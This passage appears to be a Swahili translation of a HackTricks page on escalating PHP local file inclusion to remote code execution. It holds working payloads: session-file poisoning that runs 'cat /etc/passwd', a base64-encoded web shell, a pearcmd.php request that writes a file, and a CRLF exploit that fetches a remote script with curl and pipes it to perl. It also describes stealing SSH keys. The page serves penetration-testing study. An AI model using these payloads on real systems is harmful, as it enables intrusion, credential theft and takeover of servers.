
Angalia ikiwa tovuti inatumia PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Katika PHP, sessions hizi zinahifadhiwa katika _/var/lib/php5/sess\\_\[PHPSESSID]\_ mafaili
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Weka cookie kuwa `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Tumia LFI kujumuisha PHP session file
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Kupitia ssh

Ikiwa ssh iko aktifu angalia ni mtumiaji gani anayetumika (/proc/self/status & /etc/passwd) na jaribu kufikia **\<HOME>/.ssh/id_rsa**

### **Kupitia** **vsftpd** _**logs**_

Logi za server ya FTP vsftpd ziko katika _**/var/log/vsftpd.log**_. Katika hali ambapo kuna udhaifu wa Local File Inclusion (LFI), na upatikanaji wa server ya vsftpd iliyowekwa wazi unaweza kutokea, hatua zifuatazo zinaweza kuzingatiwa:

1. Inject a PHP payload kwenye sehemu ya username wakati wa mchakato wa login.
2. Baada ya injection, tumia LFI ili kupata logi za server kutoka _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Kama ilivyoonyeshwa katika [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter huacha tu Non-base64. Unaweza kutumia hiyo ku-bypass ukaguzi wa extension ya faili: ikiwa utatoa base64 inayomalizika na ".php", itapuuza tu "." na itaongeza "php" kwa base64. Hapa kuna mfano wa payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Kupitia php filters (hakuna hitaji la faili)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)inaelezea kwamba unaweza kutumia **php filters to generate arbitrary content** kama output. Hii kwa msingi inamaanisha unaweza **generate arbitrary php code** kwa ajili ya include **without needing to write** ndani ya faili.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Kupitia segmentation fault

**Upload** faili itakayohifadhiwa kama **temporary** katika `/tmp`, kisha katika **same request,** chochea **segmentation fault**, na kisha **temporary file won't be deleted** na unaweza kuitafuta.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Kupitia Nginx temp file storage

Ikiwa umepata **Local File Inclusion** na **Nginx** inaendesha mbele ya PHP, unaweza kupata RCE kwa kutumia mbinu ifuatayo:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Kupitia PHP_SESSION_UPLOAD_PROGRESS

Ikiwa umepata **Local File Inclusion** hata kama **huna session** na `session.auto_start` iko `Off`. Ukitoa **`PHP_SESSION_UPLOAD_PROGRESS`** katika data ya **multipart POST**, PHP itafungua session kwa niaba yako. Unaweza kutumia hili kupata RCE:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Kupitia temp file uploads in Windows

Ikiwa umepata **Local File Inclusion** na server inaendesha kwenye **Windows**, unaweza kupata RCE:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Kupitia `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), script `/usr/local/lib/phppearcmd.php` ipo kwa default katika php docker images. Zaidi ya hayo, inawezekana kupitisha arguments kwa script kupitia URL kwa sababu inaonyesha kwamba ikiwa param ya URL haina `=`, inapaswa kutumika kama argument. Angalia pia [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) na [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Ombi lifuatalo litaumba faili katika `/tmp/hello.php` yenye yaliyomo `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Ifuatayo inatumia CRLF vuln kupata RCE (kutoka [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Kupitia phpinfo() (file_uploads = on)

Ikiwa umepata **Local File Inclusion** na faili inayoonyesha **phpinfo()** na file_uploads = on, unaweza kupata RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Kupitia compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ikiwa umepata **Local File Inclusion** na wewe **can exfiltrate the path** ya faili ya temp LAKINI **server** inafanya **checking** ikiwa **file to be included has PHP marks**, unaweza kujaribu **bypass that check** kwa kutumia **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Kupitia eternal waiting + bruteforce

Ikiwa unaweza kutumia LFI ku **upload temporary files** na kufanya server i **hang** utekelezaji wa PHP, basi unaweza kufanya **brute force filenames during hours** kutafuta faili ya temp:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Kwa Fatal Error

Ikiwa utaingiza yoyote ya faili `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Unahitaji kuingiza ile ile mara 2 ili kusababisha kosa hilo).

**Sijui jinsi hii inaweza kuwa na matumizi lakini inaweza kuwa.**\
_Hata ukisababisha PHP Fatal Error, PHP temporary files uploaded zinafutwa._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Marejeleo

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
